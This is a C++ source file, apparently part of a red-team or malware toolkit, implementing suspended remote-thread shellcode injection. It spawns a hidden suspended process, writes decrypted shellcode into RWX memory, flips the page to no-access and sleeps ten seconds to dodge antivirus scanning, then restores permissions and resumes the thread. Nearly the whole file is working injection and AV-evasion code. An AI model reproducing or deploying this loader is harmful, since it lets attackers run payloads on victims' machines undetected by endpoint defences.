//
// Created by Eteli on 08/03/2022.
//

#include "RemoteThreadSuspendedInjection.h"

// based of https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/
void RemoteThreadSuspendedInjection::Inject() {
    LPVOID pRemoteCode;
    DWORD currProt, temp;
    HANDLE h_proc, h_thread;

    auto pStartupInfo = new STARTUPINFO();

    auto remoteProcessInfo = new PROCESS_INFORMATION();

    CreateProcess(procName_,			    //lpApplicationName		name of process to be executed
                  nullptr,					//lpCommandLine			command line to be executed (not used so Application name is used)
                  nullptr,				//lpProcessAttributes	user specified process params using SECURITY_ATTRIBUTES struct
                  nullptr,				//lpThreadAttributes	user specified thread params using SECURITY_ATTRIBUTES struct
                  FALSE,					//bInheritHandles		Disallow the inheritance of process handles to child processes (we are not a child thread)
                  NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | CREATE_NO_WINDOW,	//dwCreationFlags		Flag to priotiry level of the process (here we are normal)
                  nullptr,					//lpEnvironment			Enviromental Vars to hand to the new process (perhaps useful for modified mimikatz?)
                  nullptr,				//lpCurrentDirectory	used to declare working directory for process (normally used by shells that need to start at $HOME)
                  pStartupInfo,				//lpStartupInfo			Our startupinfo object for process info
                  remoteProcessInfo);	//lpProcessInformation	The processinformation object we use to manipulate the process


    h_proc = remoteProcessInfo->hProcess;

    // Allocate additional space inside created process for the shellcode, RWX mem privileges required.
    pRemoteCode = VirtualAllocEx(h_proc, NULL, payload_len_, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Decrypt the shellcode with the provided details.
    Decrypt();

    // Write the shellcode into memory.
    WriteProcessMemory(h_proc, pRemoteCode, (PVOID) payload_, (SIZE_T) payload_len_, (SIZE_T *) NULL);

    // Change the mem privileges to non to avoid AV checking that address space.
    VirtualProtectEx(h_proc, pRemoteCode, payload_len_, PAGE_NOACCESS, &currProt);

    // create remote thread in suspended state.
    h_thread = CreateRemoteThread(h_proc, NULL, 0, LPTHREAD_START_ROUTINE(pRemoteCode), NULL, CREATE_SUSPENDED, nullptr);

    // sleep to try avoiding AV's scan, AVs these days could simulate changing the time using VM and could bypass this method.
    Sleep(10000);

    // switch privilege level back to RWX inorder to run the shell.
    VirtualProtectEx(h_proc, pRemoteCode, payload_len_, currProt, &temp);

    // resume suspended thread.
    ResumeThread(h_thread);

    CloseHandle(h_thread);
}